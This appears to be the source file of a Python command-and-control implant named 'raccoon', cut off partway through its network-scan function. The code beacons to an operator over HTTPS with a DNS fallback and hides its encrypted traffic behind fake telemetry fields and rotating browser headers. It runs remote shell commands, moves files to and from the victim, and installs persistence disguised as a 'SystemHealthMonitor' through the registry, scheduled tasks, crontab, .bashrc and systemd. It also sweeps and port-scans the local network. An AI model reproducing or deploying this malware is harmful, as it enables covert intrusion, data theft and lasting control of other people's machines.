#!/usr/bin/env python3
"""
C2 beacon with HTTPS primary and DNS fallback channels.
AES-GCM encrypted payloads, Venom-style network evasion,
full command set with result reporting.
"""

import base64
import hashlib
import json
import logging
import os
import platform
import random
import re
import shutil
import socket
import ssl
import stat
import subprocess
import sys
import threading
import time
from pathlib import Path
from typing import Optional

import requests
import dns.resolver
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

logger = logging.getLogger("raccoon.c2")


# ── Evasion pools ──

_USER_AGENTS = [
    "Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux aarch64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0",
    "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 OPR/107.0.0.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
]

_URL_SUFFIXES = [
    "/collect", "/submit", "/sync", "/push", "/update",
    "/report", "/log", "/track", "/event", "/data",
    "/ping", "/health", "/status", "/check", "/query",
]

_ACCEPT_LANGUAGES = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.9",
    "de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7",
    "fr-FR,fr;q=0.9,en-US;q=0.8",
    "es-ES,es;q=0.9,en;q=0.8",
    "ja-JP,ja;q=0.9,en;q=0.8",
    "zh-CN,zh;q=0.9,en;q=0.8",
    "pt-BR,pt;q=0.9,en;q=0.8",
    "nl-NL,nl;q=0.9,en;q=0.8",
    "it-IT,it;q=0.9,en;q=0.8",
]

_EXTRA_HEADERS = {
    "Sec-Ch-Ua-Platform": ['"Linux"', '"Windows"', '"macOS"'],
    "Sec-Fetch-Dest": ["empty", "document"],
    "Sec-Fetch-Mode": ["cors", "navigate", "no-cors"],
    "Sec-Fetch-Site": ["same-origin", "cross-site"],
    "Cache-Control": ["no-cache", "max-age=0", "no-store"],
    "Pragma": ["no-cache"],
    "DNT": ["1"],
    "X-Requested-With": ["XMLHttpRequest"],
}

_PAYLOAD_FIELDS = [
    "session_token", "auth_hash", "state_key", "nonce", "validation",
    "api_key", "request_token", "cipher_text", "payload_data", "signature",
    "trace_id", "correlation_id", "request_id", "transaction_id",
]


def _decoy_fields(n: int) -> dict:
    """Generate n random telemetry-like decoy fields."""
    pool = {
        "cpu_pct": lambda: round(random.uniform(2, 90), 1),
        "mem_mb": lambda: random.randint(64, 8192),
        "disk_pct": lambda: round(random.uniform(10, 95), 1),
        "request_count": lambda: random.randint(100, 99999),
        "session_count": lambda: random.randint(1, 5000),
        "error_rate": lambda: round(random.uniform(0, 5), 2),
        "latency_ms": lambda: random.randint(1, 500),
        "uptime_hrs": lambda: round(random.uniform(0.1, 720), 1),
        "queue_depth": lambda: random.randint(0, 1000),
        "cache_hit_pct": lambda: round(random.uniform(50, 99.9), 1),
        "gc_pause_ms": lambda: round(random.uniform(0.1, 50), 2),
        "thread_count": lambda: random.randint(4, 128),
        "conn_pool_active": lambda: random.randint(1, 50),
        "batch_size": lambda: random.randint(10, 500),
    }
    keys = random.sample(list(pool.keys()), min(n, len(pool)))
    return {k: pool[k]() for k in keys}


class Beacon:
    """C2 beacon with AES-GCM encryption and network evasion."""

    def __init__(self, config: dict):
        c2 = config["c2"]
        self.interval = c2.get("beacon_interval_seconds", 300)
        self.jitter = c2.get("jitter_percent", 20) / 100.0

        https_cfg = c2.get("https", {})
        dns_cfg = c2.get("dns", {})

        self.https_enabled = https_cfg.get("enabled", False)
        self.callback_url = https_cfg.get("callback_url", "")
        self.verify_ssl = https_cfg.get("verify_ssl", False)

        self.dns_enabled = dns_cfg.get("enabled", False)
        self.dns_domain = dns_cfg.get("domain", "")
        self.dns_resolver = dns_cfg.get("resolver", "8.8.8.8")

        enc_key = c2.get("encryption_key", "")
        if enc_key:
            self._key = base64.b64decode(enc_key)
        else:
            seed = f"{self.callback_url}:{self.dns_domain}".encode()
            self._key = hashlib.sha256(seed).digest()
        self._aesgcm = AESGCM(self._key)

        self._implant_id = self._generate_id()
        self._agent_id: Optional[str] = None
        self._running = False
        self._thread: Optional[threading.Thread] = None
        self._registered = False
        self._consecutive_failures = 0

    # ── Identity ──

    def _generate_id(self) -> str:
        raw = f"{platform.node()}:{platform.machine()}"
        try:
            raw += f":{open('/sys/class/net/eth0/address').read().strip()}"
        except (FileNotFoundError, PermissionError):
            pass
        return hashlib.sha256(raw.encode()).hexdigest()[:16]

    # ── Crypto ──

    def _encrypt(self, data: dict) -> str:
        plaintext = json.dumps(data, separators=(",", ":")).encode()
        nonce = os.urandom(12)
        ct = self._aesgcm.encrypt(nonce, plaintext, None)
        return base64.b64encode(nonce + ct).decode()

    def _decrypt(self, b64: str) -> dict:
        raw = base64.b64decode(b64)
        nonce, ct = raw[:12], raw[12:]
        plaintext = self._aesgcm.decrypt(nonce, ct, None)
        return json.loads(plaintext)

    # ── Evasion helpers ──

    def _evasive_url(self, endpoint: str) -> str:
        base = self.callback_url.rsplit("/", 1)[0]
        suffix = random.choice(_URL_SUFFIXES)
        ts = int(time.time() * 1000)
        qp = f"?_t={ts}&sid={random.randint(10000, 99999)}"
        return f"{base}/{endpoint}{suffix}{qp}"

    def _evasive_headers(self) -> dict:
        headers = {
            "User-Agent": random.choice(_USER_AGENTS),
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": random.choice(_ACCEPT_LANGUAGES),
            "Content-Type": "application/json",
        }
        extra_keys = random.sample(
            list(_EXTRA_HEADERS.keys()),
            random.randint(2, min(4, len(_EXTRA_HEADERS))),
        )
        for k in extra_keys:
            headers[k] = random.choice(_EXTRA_HEADERS[k])
        return headers

    def _wrap_payload(self, data: dict) -> dict:
        encrypted = self._encrypt(data)
        field = random.choice(_PAYLOAD_FIELDS)
        payload = {field: encrypted}
        payload.update(_decoy_fields(random.randint(4, 10)))
        return dict(sorted(payload.items()))

    def _unwrap_response(self, body: dict) -> Optional[dict]:
        for field in _PAYLOAD_FIELDS:
            if field in body:
                try:
                    return self._decrypt(body[field])
                except Exception:
                    continue
        for v in body.values():
            if isinstance(v, str) and len(v) > 32:
                try:
                    return self._decrypt(v)
                except Exception:
                    continue
        return None

    # ── System info ──

    def _system_info(self) -> dict:
        return {
            "id": self._implant_id,
            "agent_id": self._agent_id,
            "hostname": platform.node(),
            "os": f"{platform.system()} {platform.release()}",
            "arch": platform.machine(),
            "pid": os.getpid(),
            "user": os.getenv("USER", os.getenv("USERNAME", "unknown")),
            "uptime": self._get_uptime(),
            "interval": self.interval,
            "local_ips": self._get_local_ips(),
        }

    @staticmethod
    def _get_local_ips() -> list:
        ips = []
        try:
            for info in socket.getaddrinfo(socket.gethostname(), None, socket.AF_INET):
                addr = info[4][0]
                if addr not in ips and addr != "127.0.0.1":
                    ips.append(addr)
        except Exception:
            pass
        if not ips:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                ips.append(s.getsockname()[0])
                s.close()
            except Exception:
                pass
        return ips

    @staticmethod
    def _get_uptime() -> int:
        try:
            with open("/proc/uptime") as f:
                return int(float(f.read().split()[0]))
        except (FileNotFoundError, PermissionError):
            return 0

    # ── Timing ──

    def _jittered_sleep(self):
        offset = self.interval * self.jitter
        delay = self.interval + random.uniform(-offset, offset)
        time.sleep(max(10, delay))

    def _backoff_sleep(self):
        delay = min(5 * (1.5 ** self._consecutive_failures), 300)
        delay += random.uniform(0, delay * 0.2)
        logger.debug("Backoff %.1fs (failures=%d)", delay, self._consecutive_failures)
        time.sleep(delay)

    # ── HTTPS transport ──

    def _https_post(self, endpoint: str, data: dict) -> Optional[dict]:
        """POST encrypted payload; returns decrypted response or None on error."""
        try:
            resp = requests.post(
                self._evasive_url(endpoint),
                json=self._wrap_payload(data),
                headers=self._evasive_headers(),
                verify=self.verify_ssl,
                timeout=30,
            )
            if resp.status_code == 200:
                body = resp.json()
                result = self._unwrap_response(body)
                return result if result else {}
        except Exception as e:
            logger.debug("HTTPS %s failed: %s", endpoint, e)
        return None

    def _register_https(self) -> bool:
        info = self._system_info()
        info["action"] = "register"
        result = self._https_post("register", info)
        if result is not None and result.get("success"):
            self._agent_id = result.get("agent_id", self._implant_id)
            self._registered = True
            logger.info("Registered as %s", self._agent_id)
            return True
        return False

    def _beacon_https(self) -> Optional[dict]:
        info = self._system_info()
        info["action"] = "beacon"
        return self._https_post("beacon", info)

    def _send_result_https(self, task_id: str, status: str, output: str,
                           data: Optional[dict] = None):
        result = {
            "action": "result",
            "agent_id": self._agent_id or self._implant_id,
            "task_id": task_id,
            "status": status,
            "output": output,
        }
        if data:
            result["data"] = data
        self._https_post("result", result)

    # ── DNS transport ──

    def _beacon_dns(self) -> Optional[dict]:
        try:
            agent = self._agent_id or self._implant_id
            encoded_id = base64.b32encode(agent.encode()).decode().rstrip("=").lower()
            query = f"{encoded_id}.b.{self.dns_domain}"

            resolver = dns.resolver.Resolver()
            resolver.nameservers = [self.dns_resolver]
            resolver.timeout = 10
            resolver.lifetime = 10

            answers = resolver.resolve(query, "TXT")
            for rdata in answers:
                txt = b"".join(rdata.strings).decode()
                try:
                    return self._decrypt(txt)
                except Exception:
                    try:
                        return json.loads(base64.b64decode(txt))
                    except Exception:
                        pass
        except Exception as e:
            logger.debug("DNS beacon failed: %s", e)
        return None

    # ── Command execution (pure Python for file ops, subprocess only for shell) ──

    def _exec_shell(self, cmd: str, timeout: int = 300) -> str:
        try:
            r = subprocess.run(
                cmd, shell=True,
                capture_output=True, text=True,
                timeout=timeout,
            )
            output = r.stdout
            if r.stderr:
                output += f"\n[stderr]\n{r.stderr}"
            if r.returncode != 0:
                output += f"\n[exit {r.returncode}]"
            return output[:65536]
        except subprocess.TimeoutExpired:
            return f"[timeout after {timeout}s]"
        except Exception as e:
            return f"[error: {e}]"

    def _exec_ls(self, path: str = ".") -> str:
        try:
            p = Path(path)
            if not p.exists():
                return f"ls: {path}: No such file or directory"
            lines = []
            for entry in sorted(p.iterdir()):
                try:
                    st = entry.stat()
                    mode = stat.filemode(st.st_mode)
                    size = st.st_size
                    mtime = time.strftime("%Y-%m-%d %H:%M", time.localtime(st.st_mtime))
                    lines.append(f"{mode} {size:>10} {mtime} {entry.name}")
                except OSError:
                    lines.append(f"?????????? ? {entry.name}")
            return "\n".join(lines) if lines else "(empty)"
        except Exception as e:
            return f"[error: {e}]"

    def _exec_cat(self, path: str) -> str:
        try:
            return Path(path).read_text(errors="replace")[:65536]
        except Exception as e:
            return f"[error: {e}]"

    def _exec_download(self, path: str) -> dict:
        try:
            data = Path(path).read_bytes()
            if len(data) > 10 * 1024 * 1024:
                return {"error": f"File too large ({len(data)} bytes, max 10MB)"}
            return {
                "filename": Path(path).name,
                "size": len(data),
                "data": base64.b64encode(data).decode(),
            }
        except Exception as e:
            return {"error": str(e)}

    def _exec_upload(self, path: str, data_b64: str) -> str:
        try:
            target = Path(path)
            target.parent.mkdir(parents=True, exist_ok=True)
            target.write_bytes(base64.b64decode(data_b64))
            return f"Uploaded {target} ({target.stat().st_size} bytes)"
        except Exception as e:
            return f"[error: {e}]"

    @staticmethod
    def _exec_pwd() -> str:
        return os.getcwd()

    @staticmethod
    def _exec_cd(path: str) -> str:
        try:
            os.chdir(path)
            return os.getcwd()
        except Exception as e:
            return f"[error: {e}]"

    @staticmethod
    def _exec_cp(src: str, dst: str) -> str:
        try:
            if Path(src).is_dir():
                shutil.copytree(src, dst)
            else:
                shutil.copy2(src, dst)
            return f"Copied {src} -> {dst}"
        except Exception as e:
            return f"[error: {e}]"

    @staticmethod
    def _exec_mv(src: str, dst: str) -> str:
        try:
            shutil.move(src, dst)
            return f"Moved {src} -> {dst}"
        except Exception as e:
            return f"[error: {e}]"

    @staticmethod
    def _exec_rm(path: str) -> str:
        try:
            p = Path(path)
            if p.is_dir():
                shutil.rmtree(path)
            else:
                p.unlink()
            return f"Removed {path}"
        except Exception as e:
            return f"[error: {e}]"

    @staticmethod
    def _exec_mkdir(path: str) -> str:
        try:
            Path(path).mkdir(parents=True, exist_ok=True)
            return f"Created {path}"
        except Exception as e:
            return f"[error: {e}]"

    @staticmethod
    def _exec_chmod(mode: str, path: str) -> str:
        try:
            os.chmod(path, int(mode, 8))
            return f"chmod {mode} {path}"
        except Exception as e:
            return f"[error: {e}]"

    @staticmethod
    def _exec_write(path: str, content: str) -> str:
        try:
            target = Path(path)
            target.parent.mkdir(parents=True, exist_ok=True)
            target.write_text(content)
            return f"Wrote {len(content)} bytes to {path}"
        except Exception as e:
            return f"[error: {e}]"

    # ── Persistence ──

    def _get_beacon_path(self) -> str:
        return os.path.abspath(sys.argv[0])

    def _exec_persist(self, method: str) -> str:
        method = (method or "auto").strip().lower()
        beacon_path = self._get_beacon_path()
        python_path = sys.executable
        cmd_line = f"{python_path} {beacon_path}"

        if method == "auto":
            method = "registry" if platform.system() == "Windows" else "crontab"

        try:
            if method == "registry":
                if platform.system() != "Windows":
                    return "[error] Registry persistence only available on Windows"
                import winreg
                key = winreg.OpenKey(
                    winreg.HKEY_CURRENT_USER,
                    r"Software\Microsoft\Windows\CurrentVersion\Run",
                    0, winreg.KEY_SET_VALUE,
                )
                winreg.SetValueEx(key, "SystemHealthMonitor", 0, winreg.REG_SZ, cmd_line)
                winreg.CloseKey(key)
                return f"Persistence installed: HKCU\\...\\Run\\SystemHealthMonitor\n{cmd_line}"

            elif method == "startup":
                if platform.system() != "Windows":
                    return "[error] Startup folder persistence only available on Windows"
                startup = Path(os.environ.get("APPDATA", "")) / \
                    r"Microsoft\Windows\Start Menu\Programs\Startup"
                lnk_vbs = startup / "SystemHealth.vbs"
                lnk_vbs.write_text(
                    f'CreateObject("WScript.Shell").Run "{cmd_line}", 0, False\n'
                )
                return f"Persistence installed: {lnk_vbs}"

            elif method == "schtask":
                if platform.system() != "Windows":
                    return "[error] Scheduled task persistence only available on Windows"
                result = subprocess.run(
                    ["schtasks", "/create", "/tn", "SystemHealthMonitor",
                     "/tr", cmd_line, "/sc", "onlogon", "/rl", "highest", "/f"],
                    capture_output=True, text=True, timeout=15,
                )
                if result.returncode == 0:
                    return f"Persistence installed: schtask SystemHealthMonitor\n{result.stdout.strip()}"
                return f"[error] {result.stderr.strip()}"

            elif method == "crontab":
                if platform.system() == "Windows":
                    return "[error] Crontab not available on Windows"
                existing = subprocess.run(
                    ["crontab", "-l"], capture_output=True, text=True, timeout=10,
                )
                lines = existing.stdout if existing.returncode == 0 else ""
                marker = "# raccoon-persist"
                if marker in lines:
                    return "Persistence already installed (crontab)"
                entry = f"@reboot {cmd_line} {marker}\n"
                new_cron = lines.rstrip("\n") + "\n" + entry
                proc = subprocess.run(
                    ["crontab", "-"], input=new_cron, capture_output=True, text=True, timeout=10,
                )
                if proc.returncode == 0:
                    return f"Persistence installed: crontab @reboot\n{cmd_line}"
                return f"[error] {proc.stderr.strip()}"

            elif method == "bashrc":
                if platform.system() == "Windows":
                    return "[error] bashrc not available on Windows"
                rc = Path.home() / ".bashrc"
                marker = "# raccoon-persist"
                content = rc.read_text() if rc.exists() else ""
                if marker in content:
                    return "Persistence already installed (.bashrc)"
                line = f"\n(nohup {cmd_line} &>/dev/null &) {marker}\n"
                rc.write_text(content + line)
                return f"Persistence installed: ~/.bashrc"

            elif method == "systemd":
                if platform.system() == "Windows":
                    return "[error] systemd not available on Windows"
                svc_dir = Path.home() / ".config" / "systemd" / "user"
                svc_dir.mkdir(parents=True, exist_ok=True)
                svc = svc_dir / "system-health.service"
                svc.write_text(
                    f"[Unit]\nDescription=System Health Monitor\n\n"
                    f"[Service]\nExecStart={cmd_line}\nRestart=always\n"
                    f"RestartSec=30\n\n[Install]\nWantedBy=default.target\n"
                )
                subprocess.run(
                    ["systemctl", "--user", "enable", "--now", "system-health"],
                    capture_output=True, text=True, timeout=15,
                )
                return f"Persistence installed: systemd user service\n{svc}"

            else:
                return f"[error] Unknown method: {method}\nAvailable: auto, registry, startup, schtask, crontab, bashrc, systemd"

        except Exception as e:
            return f"[error] {e}"

    def _exec_unpersist(self, method: str) -> str:
        method = (method or "auto").strip().lower()
        if method == "auto":
            method = "registry" if platform.system() == "Windows" else "crontab"

        try:
            if method == "registry":
                import winreg
                key = winreg.OpenKey(
                    winreg.HKEY_CURRENT_USER,
                    r"Software\Microsoft\Windows\CurrentVersion\Run",
                    0, winreg.KEY_SET_VALUE,
                )
                try:
                    winreg.DeleteValue(key, "SystemHealthMonitor")
                except FileNotFoundError:
                    return "No registry persistence found"
                finally:
                    winreg.CloseKey(key)
                return "Registry persistence removed"

            elif method == "startup":
                lnk = Path(os.environ.get("APPDATA", "")) / \
                    r"Microsoft\Windows\Start Menu\Programs\Startup\SystemHealth.vbs"
                if lnk.exists():
                    lnk.unlink()
                    return f"Startup persistence removed: {lnk}"
                return "No startup persistence found"

            elif method == "schtask":
                result = subprocess.run(
                    ["schtasks", "/delete", "/tn", "SystemHealthMonitor", "/f"],
                    capture_output=True, text=True, timeout=15,
                )
                return result.stdout.strip() or result.stderr.strip() or "Scheduled task removed"

            elif method == "crontab":
                existing = subprocess.run(
                    ["crontab", "-l"], capture_output=True, text=True, timeout=10,
                )
                if existing.returncode != 0:
                    return "No crontab found"
                marker = "# raccoon-persist"
                lines = [l for l in existing.stdout.splitlines() if marker not in l]
                subprocess.run(
                    ["crontab", "-"], input="\n".join(lines) + "\n",
                    capture_output=True, text=True, timeout=10,
                )
                return "Crontab persistence removed"

            elif method == "bashrc":
                rc = Path.home() / ".bashrc"
                if not rc.exists():
                    return "No .bashrc found"
                marker = "# raccoon-persist"
                lines = [l for l in rc.read_text().splitlines() if marker not in l]
                rc.write_text("\n".join(lines) + "\n")
                return ".bashrc persistence removed"

            elif method == "systemd":
                subprocess.run(
                    ["systemctl", "--user", "disable", "--now", "system-health"],
                    capture_output=True, text=True, timeout=15,
                )
                svc = Path.home() / ".config" / "systemd" / "user" / "system-health.service"
                if svc.exists():
                    svc.unlink()
                return "Systemd persistence removed"

            else:
                return f"[error] Unknown method: {method}"

        except Exception as e:
            return f"[error] {e}"

    # ── ARP table ──

    _MAC_PREFIXES = {
        "00:50:56": "VMware", "00:0c:29": "VMware", "00:05:69": "VMware",
        "00:1c:14": "VMware", "00:15:5d": "Hyper-V", "08:00:27": "VirtualBox",
        "0a:00:27": "VirtualBox", "52:54:00": "QEMU/KVM",
        "b8:27:eb": "Raspberry Pi", "dc:a6:32": "Raspberry Pi",
        "e4:5f:01": "Raspberry Pi", "d8:3a:dd": "Raspberry Pi",
        "ac:de:48": "Apple", "00:1b:63": "Apple", "3c:22:fb": "Apple",
        "f8:ff:c2": "Apple",
        "00:1a:a0": "Dell", "f8:db:88": "Dell", "00:14:22": "Dell",
        "00:1e:c9": "Dell",
        "00:25:b5": "HP", "3c:d9:2b": "HP", "d4:c9:ef": "HP",
        "70:10:6f": "HP",
        "00:1c:c0": "Intel", "a4:bf:01": "Intel", "00:1b:21": "Intel",
        "f8:63:3f": "Intel",
        "00:04:4b": "Nvidia", "48:b0:2d": "Nvidia",
        "b4:2e:99": "Cisco", "00:1b:0d": "Cisco", "00:1e:14": "Cisco",
        "00:26:0b": "Cisco", "00:50:0f": "Cisco",
        "00:09:0f": "Fortinet", "00:60:b0": "Hewlett Packard",
        "f0:9f:c2": "Ubiquiti", "24:a4:3c": "Ubiquiti",
        "44:d9:e7": "Ubiquiti", "fc:ec:da": "Ubiquiti",
        "00:1a:2b": "Juniper", "00:05:85": "Juniper",
        "00:23:9c": "Juniper",
        "00:0d:b9": "PC Engines", "00:08:e3": "Huawei",
        "00:e0:fc": "Huawei", "48:46:fb": "Huawei",
        "08:00:20": "Sun/Oracle", "00:03:ba": "Sun/Oracle",
        "00:1d:09": "TP-Link", "50:c7:bf": "TP-Link",
        "ec:08:6b": "TP-Link",
        "a8:5e:45": "ASUS", "00:1a:92": "ASUS",
        "00:1f:1f": "ASUS",
        "bc:5f:f4": "ASRock", "d0:50:99": "ASRock",
        "00:0e:8f": "Netgear", "c0:ff:d4": "Netgear",
        "30:46:9a": "Netgear",
        "e0:91:f5": "Synology", "00:11:32": "Synology",
        "c4:3d:c7": "Netgear", "20:cf:30": "QNAP",
        "00:08:9b": "QNAP",
        "b0:be:76": "TP-Link", "14:cc:20": "TP-Link",
        "00:24:d4": "Freebox", "68:a3:78": "Freebox",
        "02:42": "Docker",
    }

    @classmethod
    def _mac_vendor(cls, mac: str) -> str:
        m = mac.lower().replace("-", ":")
        for prefix_len in (8, 5):
            prefix = m[:prefix_len]
            if prefix in cls._MAC_PREFIXES:
                return cls._MAC_PREFIXES[prefix]
        return ""

    @staticmethod
    def _guess_os(ports: list, vendor: str) -> str:
        ps = set(ports)
        if 3389 in ps or 135 in ps or 139 in ps:
            return "Windows"
        if 548 in ps or 5353 in ps:
            return "macOS" if "Apple" in vendor else "Apple/macOS"
        if 22 in ps and 111 in ps:
            return "Linux/Unix"
        if 22 in ps:
            return "Linux"
        if 80 in ps or 443 in ps:
            if vendor:
                if "Cisco" in vendor or "Juniper" in vendor or "Fortinet" in vendor:
                    return "Network Device"
                if "Ubiquiti" in vendor:
                    return "Ubiquiti AP"
                if "Synology" in vendor or "QNAP" in vendor:
                    return "NAS"
            return "Web Device"
        if vendor and ("Raspberry" in vendor):
            return "Linux (RPi)"
        return ""

    @staticmethod
    def _probe_ports(ip: str, ports: list, timeout: float = 0.8) -> list:
        open_ports = []
        for p in ports:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(timeout)
                s.connect((ip, p))
                open_ports.append(p)
                s.close()
            except Exception:
                pass
        return open_ports

    _SSL_PORTS = {443, 993, 995, 8443, 636, 989, 990, 992, 5986, 9443}

    @staticmethod
    def _grab_banner(ip: str, port: int, timeout: float = 1.5) -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            s.connect((ip, port))
            if port in Beacon._SSL_PORTS or port == 443:
                s.close()
                return Beacon._probe_ssl(ip, port, timeout)
            if port in (80, 8080, 8888, 9090):
                s.sendall(b"HEAD / HTTP/1.1\r\nHost: " + ip.encode() + b"\r\nConnection: close\r\n\r\n")
            elif port == 21:
                pass
            elif port == 25:
                pass
            else:
                s.sendall(b"\r\n")
            s.settimeout(2.0)
            data = s.recv(512)
            s.close()
            line = data.decode("utf-8", errors="replace").split("\n")[0].strip()
            return line[:160]
        except Exception:
            return ""

    @staticmethod
    def _probe_ssl(ip: str, port: int, timeout: float = 2.0) -> str:
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            with socket.create_connection((ip, port), timeout=timeout) as sock:
                with ctx.wrap_socket(sock, server_hostname=ip) as ssock:
                    cert = ssock.getpeercert(binary_form=False)
                    der = ssock.getpeercert(binary_form=True)
                    ver = ssock.version() or "?"
                    if cert:
                        subj = dict(x[0] for x in cert.get("subject", ()))
                        cn = subj.get("commonName", "?")
                        issuer = dict(x[0] for x in cert.get("issuer", ()))
                        issuer_cn = issuer.get("commonName", issuer.get("organizationName", "?"))
                        not_after = cert.get("notAfter", "?")
                        san_list = []
                        for typ, val in cert.get("subjectAltName", ()):
                            if typ == "DNS":
                                san_list.append(val)
                        san = ", ".join(san_list[:4])
                        parts = [ver, f"CN={cn}"]
                        if issuer_cn != cn:
                            parts.append(f"Issuer={issuer_cn}")
                        parts.append(f"Expires={not_after}")
                        if san:
                            parts.append(f"SAN=[{san}]")
                        return " | ".join(parts)
                    else:
                        return f"{ver} | self-signed/no-cert"
        except ssl.SSLError as e:
            return f"SSL-Error: {str(e)[:80]}"
        except Exception:
            return "SSL"

    _PORT_NAMES = {
        21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
        80: "HTTP", 110: "POP3", 111: "RPC", 135: "MSRPC", 139: "NetBIOS",
        143: "IMAP", 161: "SNMP", 389: "LDAP", 443: "HTTPS", 445: "SMB",
        548: "AFP", 631: "IPP", 993: "IMAPS", 995: "POP3S",
        1433: "MSSQL", 1521: "Oracle", 3306: "MySQL", 3389: "RDP",
        5353: "mDNS", 5432: "PostgreSQL", 5900: "VNC", 5985: "WinRM",
        6379: "Redis", 8080: "HTTP-Alt", 8443: "HTTPS-Alt",
        8888: "HTTP-Alt", 9090: "HTTP-Alt", 9200: "Elasticsearch",
        27017: "MongoDB",
    }

    def _ping_sweep(self):
        local_ips = self._get_local_ips()
        if not local_ips:
            return
        bases = set()
        for ip in local_ips:
            parts = ip.rsplit(".", 1)
            if len(parts) == 2:
                bases.add(parts[0])

        def _ping(target):
            try:
                if platform.system() == "Windows":
                    subprocess.run(
                        ["ping", "-n", "1", "-w", "500", target],
                        capture_output=True, timeout=3,
                    )
                else:
                    subprocess.run(
                        ["ping", "-c", "1", "-W", "1", target],
                        capture_output=True, timeout=3,
                    )
            except Exception:
                pass

        threads = []
        for base in list(bases)[:3]:
            for i in range(1, 255):
                t = threading.Thread(target=_ping, args=(f"{base}.{i}",), daemon=True)
                threads.append(t)
                t.start()
                if len(threads) >= 30:
                    for tt in threads:
                        tt.join(timeout=2)
                    threads = []
        for tt in threads:
            tt.join(timeout=2)

    def _exec_arptable(self) -> str:
        self._ping_sweep()
        entries = []
        try:
            if platform.system() == "Windows":
                r = subprocess.run(
                    ["arp", "-a"], capture_output=True, text=True, timeout=10,
                )
                for line in r.stdout.splitlines():
                    parts = line.split()
                    if len(parts) >= 3 and parts[0].count(".") == 3:
                        ip = parts[0]
                        mac = parts[1].replace("-", ":")
                        typ = parts[2] if len(parts) > 2 else "?"
                        first_octet = int(ip.split(".")[0])
                        if ip not in ("255.255.255.255",) and not ip.endswith(".255") and first_octet < 224:
                            entries.append({"ip": ip, "mac": mac, "type": typ})
            else:
                r = subprocess.run(
                    ["arp", "-a"], capture_output=True, text=True, timeout=10,
                )
                if r.returncode != 0:
                    r = subprocess.run(
                        ["ip", "neigh", "show"], capture_output=True, text=True, timeout=10,
                    )
                for line in r.stdout.splitlines():
                    ip_m = re.search(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})", line)
                    mac_m = re.search(r"([\da-fA-F]{2}[:-]){5}[\da-fA-F]{2}", line)
                    if ip_m:
                        ip = ip_m.group(1)
                        mac = mac_m.group(0) if mac_m else "?"
                        first_octet = int(ip.split(".")[0])
                        if ip not in ("255.255.255.255",) and not ip.endswith(".255") and first_octet < 224:
                            entries.append({"ip": ip, "mac": mac, "type": "?"})
        except Exception as e:
            return f"[error] {e}"

        seen_ips = set()
        unique = []
        for ent in entries:
            if ent["ip"] not in seen_ips:
                seen_ips.add(ent["ip"])
                unique.append(ent)
        entries = unique

        my_ips = set(self._get_local_ips())
        common_ports = [21,22,23,25,53,80,110,111,135,139,143,161,389,
                        443,445,548,636,631,993,995,1433,1521,
                        3306,3389,5353,5432,5900,5985,5986,
                        6379,8080,8443,8888,9090,9200,9443,27017]
        threads = []
        lock = threading.Lock()

        def enrich(ent):
            ip = ent["ip"]
            try:
                h = socket.getfqdn(ip)
                ent["hostname"] = "" if h == ip else h
            except Exception:
                ent["hostname"] = ""
            ent["vendor"] = self._mac_vendor(ent["mac"])
            ent["ports"] = self._probe_ports(ip, common_ports)
            ent["os_guess"] = self._guess_os(ent["ports"], ent["vendor"])
            ent["self"] = ip in my_ips
            banners = {}
            for p in ent["ports"][:8]:
                b = self._grab_banner(ip, p)
                if b:
                    banners[str(p)] = b
            ent["banners"] = banners
            port_info = []
            for p in ent["ports"]:
                name = self._PORT_NAMES.get(p, "")
                banner = banners.get(p, "")
                s = str(p)
                if name:
                    s += "/" + name
                if banner:
                    s += " (" + banner + ")"
                port_info.append(s)
            ent["port_info"] = port_info

        for ent in entries:
            t = threading.Thread(target=enrich, args=(ent,), daemon=True)
            threads.append(t)
            t.start()
            if len(threads) >= 10:
                for tt in threads:
                    tt.join(timeout=5)
                threads = []
        for tt in threads:
            tt.join(timeout=5)

        result = json.dumps({"entries": entries, "count": len(entries)})
        return result

    # ── Network scan ──

    def _exec_netscan(self, args: str) -> str:
        timeout_s = 1
        parts = args.strip().split() if args else []
        subnet = parts[0] if parts else ""

        if not subnet:
            for ip in self._get_local_ips():
                octets = ip.rsplit(".", 1)
                if len(octets) == 2:
                    subnet = octets[0] + ".0/24"
                    break

        if not subnet:
            return "[error] No subnet specified and no local IP found"

        base = subnet.split("/")[0].rsplit(".", 1)[0]
        results = []
        results.append(f"Scanning {base}.0/24 ...")

        def _ping_host(ip):
            try:
                if platform.system() == "Windows":
